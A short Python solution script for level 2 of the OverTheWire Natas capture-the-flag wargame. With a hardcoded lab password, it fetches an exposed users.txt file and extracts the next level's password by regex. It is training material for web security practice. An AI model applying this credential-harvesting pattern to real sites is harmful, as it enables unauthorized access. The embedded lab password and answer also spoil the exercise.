#!/usr/bin/python3

import requests
import re

level = 2
username = 'natas%s' % level
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'
url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

response = requests.get(url, auth=(username, password))
password = re.findall('natas%s:(.*)' % str(level+1), response.text)[0]

print(password)

